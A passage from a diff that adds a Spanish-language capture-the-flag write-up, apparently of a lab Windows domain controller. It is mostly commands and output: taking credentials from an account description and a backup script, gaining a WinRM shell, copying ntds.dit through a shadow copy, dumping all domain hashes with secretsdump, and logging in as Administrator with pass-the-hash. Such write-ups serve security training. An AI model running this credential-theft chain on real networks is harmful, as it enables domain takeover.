+SMB  10.129.231.149  445  CICADA-DC  krbtgt               2024-03-14 11:14:10  0  Key Distribution Center Service Account
+SMB  10.129.231.149  445  CICADA-DC  john.smoulder        2024-03-14 12:17:29  1
+SMB  10.129.231.149  445  CICADA-DC  sarah.dantelia       2024-03-14 12:17:29  1
+SMB  10.129.231.149  445  CICADA-DC  michael.wrightson    2024-03-14 12:17:29  0
+SMB  10.129.231.149  445  CICADA-DC  david.orelious       2024-03-14 12:17:29  1  Just in case I forget my password is aRt$Lp#7t*VQ!3
+SMB  10.129.231.149  445  CICADA-DC  emily.oscars         2024-08-22 21:20:17  1</code></pre>
+
+                <p><code>david.orelious</code> guardó su contraseña en el campo de descripción de su propia cuenta.
+                    Nuevas credenciales: <code>david.orelious:aRt$Lp#7t*VQ!3</code>.</p>
+
+                <p>Esta cuenta tampoco tiene acceso WinRM, pero sí tiene permiso de lectura sobre el share
+                    <code>DEV</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -U <span style="color:#e06c75;">'david.orelious%aRt$Lp#7t*VQ!3'</span> //cicada.htb/DEV</code></pre>
+
+                <pre><code class="language-plaintext">smb: \> dir
+  .                                   D        0
+  ..                                  D        0
+  Backup_script.ps1                   A      601</code></pre>
+
+                <pre><code class="language-bash">smb: \> get Backup_script.ps1</code></pre>
+
+                <h2>Credenciales en el Script de Backup — emily.oscars</h2>
+                <p>El script PowerShell descargado contiene credenciales hardcodeadas:</p>
+
+                <pre><code class="language-powershell"><span style="color:#c678dd;">$sourceDirectory</span> = <span style="color:#98c379;">"C:\smb"</span>
+<span style="color:#c678dd;">$destinationDirectory</span> = <span style="color:#98c379;">"D:\Backup"</span>
+
+<span style="color:#c678dd;">$username</span> = <span style="color:#98c379;">"emily.oscars"</span>
+<span style="color:#c678dd;">$password</span> = <span style="color:#61afef;">ConvertTo-SecureString</span> <span style="color:#98c379;">"Q!3@Lp#M6b*7t*Vt"</span> -AsPlainText -Force
+<span style="color:#c678dd;">$credentials</span> = <span style="color:#61afef;">New-Object</span> System.Management.Automation.PSCredential(<span style="color:#c678dd;">$username</span>, <span style="color:#c678dd;">$password</span>)
+
+<span style="color:#c678dd;">$dateStamp</span> = <span style="color:#61afef;">Get-Date</span> -Format <span style="color:#98c379;">"yyyyMMdd_HHmmss"</span>
+<span style="color:#c678dd;">$backupFileName</span> = <span style="color:#98c379;">"smb_backup_$dateStamp.zip"</span>
+<span style="color:#c678dd;">$backupFilePath</span> = <span style="color:#61afef;">Join-Path</span> -Path <span style="color:#c678dd;">$destinationDirectory</span> -ChildPath <span style="color:#c678dd;">$backupFileName</span>
+
+<span style="color:#61afef;">Compress-Archive</span> -Path <span style="color:#c678dd;">$sourceDirectory</span> -DestinationPath <span style="color:#c678dd;">$backupFilePath</span>
+<span style="color:#61afef;">Write-Host</span> <span style="color:#98c379;">"Backup completed successfully. Backup file saved to: $backupFilePath"</span></code></pre>
+
+                <p>Tercer set de credenciales: <code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code>.</p>
+
+                <h2>Acceso Inicial — WinRM como emily.oscars</h2>
+                <p>Verifico que <code>emily.oscars</code> tiene acceso WinRM antes de conectarme:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> winrm cicada.htb -u <span style="color:#e06c75;">'emily.oscars'</span> -p <span style="color:#e06c75;">'Q!3@Lp#M6b*7t*Vt'</span></code></pre>
+
+                <pre><code class="language-plaintext">WINRM  10.129.231.149  5985  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">evil-winrm</span> -i cicada.htb -u <span style="color:#e06c75;">'emily.oscars'</span> -p <span style="color:#e06c75;">'Q!3@Lp#M6b*7t*Vt'</span></code></pre>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents></code></pre>
+
+                <p>Acceso shell confirmado. Ya puedo recuperar la flag de usuario desde el Escritorio.</p>
+
+                <h2>Escalada de Privilegios — SeBackupPrivilege</h2>
+                <p>Compruebo los privilegios del token actual y encuentro algo valioso:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">whoami</span> /priv</code></pre>
+
+                <pre><code class="language-plaintext">PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre>
+
+                <p><code>SeBackupPrivilege</code> permite leer <em>cualquier</em> archivo del sistema, saltándose
+                    todas las ACLs del sistema de archivos. Esto hace posible extraer el archivo de base de datos de
+                    Active Directory <code>ntds.dit</code>, que almacena todos los hashes de credenciales del dominio.</p>
+
+                <p>El problema es que <code>ntds.dit</code> está bloqueado mientras el sistema está activo y no se
+                    puede acceder directamente. La solución es crear una copia de volumen en sombra (Volume Shadow
+                    Copy) de la unidad <code>C:</code> y leer el archivo desde esa instantánea.</p>
+
+                <h3>Creando una Copia de Volumen en Sombra con diskshadow</h3>
+                <p>Creo un directorio de trabajo y un archivo de script para <code>diskshadow</code>:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">mkdir</span> C:\temp
+<span style="color:#61afef;">cd</span> C:\temp</code></pre>
+
+                <p>Contenido de <code>C:\temp\shadow.txt</code>:</p>
+
+                <pre><code class="language-plaintext">set context persistent nowriters
+add volume c: alias pwn
+create
+expose %pwn% z:</code></pre>
+
+                <p>Estas instrucciones indican a <code>diskshadow</code> que cree una copia en sombra persistente de
+                    <code>C:</code> y la exponga como unidad <code>z:\</code>. Lo ejecuto:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">diskshadow</span> /s C:\temp\shadow.txt</code></pre>
+
+                <pre><code class="language-plaintext">-> set context persistent nowriters
+-> add volume c: alias pwn
+-> create
+Alias pwn for shadow ID {36cde1b4-2301-490a-9995-b2ee24875967} set as environment variable.
+[...]
+-> expose %pwn% z:
+-> %pwn% = {36cde1b4-2301-490a-9995-b2ee24875967}
+The shadow copy was successfully exposed as z:\.</code></pre>
+
+                <p>Verifico que la instantánea es accesible:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">ls</span> z:\</code></pre>
+
+                <pre><code class="language-plaintext">Directory: z:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-----         2/22/2026   8:42 PM                temp
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows</code></pre>
+
+                <h3>Extrayendo ntds.dit con robocopy</h3>
+                <p>Uso <code>robocopy</code> con el flag <code>/b</code> (modo backup) para copiar
+                    <code>ntds.dit</code> desde la copia en sombra, aprovechando <code>SeBackupPrivilege</code> para
+                    saltarse la ACL del archivo:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">robocopy</span> /b z:\Windows\NTDS\ C:\temp\ ntds.dit</code></pre>
+
+                <pre><code class="language-plaintext">-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+  Source : z:\Windows\NTDS\
+    Dest : C:\temp\
+   Files : ntds.dit
+[...]
+          1    z:\Windows\NTDS\
+ New File        16.0 m    ntds.dit</code></pre>
+
+                <h3>Extrayendo el SYSTEM hive</h3>
+                <p>El archivo <code>ntds.dit</code> solo no es suficiente — Windows encripta los datos de credenciales
+                    usando una clave de arranque (SysKey) almacenada en el hive del registro SYSTEM. Necesito ambos
+                    archivos para descifrar los hashes:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">reg</span> save HKLM\SYSTEM C:\temp\system.hiv</code></pre>
+
+                <p>Me bajo los dos archivos a mi máquina local:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">download</span> ntds.dit
+<span style="color:#61afef;">download</span> system.hiv</code></pre>
+
+                <h3>Volcando los Hashes con impacket-secretsdump</h3>
+                <p>Con ambos archivos en mi máquina, ejecuto <code>impacket-secretsdump</code> en modo offline para
+                    descifrar y extraer todos los hashes de credenciales del dominio:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">impacket-secretsdump</span> -ntds ntds.dit -system system.hiv LOCAL</code></pre>
+
+                <pre><code class="language-plaintext">Impacket v0.14.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
+cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
+cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
+cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
+cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
+cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
+[*] Kerberos keys from ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
+[...]</code></pre>
+
+                <p>El hash NT del Administrador ya está disponible. No es necesario crackearlo — puedo autenticarme
+                    directamente usando Pass-the-Hash.</p>
+
+                <h2>Acceso Root — Pass-the-Hash como Administrator</h2>
+                <pre><code class="language-bash"><span style="color:#86b300;">evil-winrm</span> -i cicada.htb -u <span style="color:#e06c75;">'Administrator'</span> -H <span style="color:#e06c75;">'2b87e7c93a3e8a0ea4a581937016f341'</span></code></pre>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cicada\administrator</code></pre>
+
+                <p>Acceso total como administrador del dominio conseguido. La flag de root está disponible en el
+                    Escritorio del Administrador.</p>
+            </div>
+
+        </article>
+    </main>
+
+    <script src="../../index.js"></script>
+</body>
+
+</html>
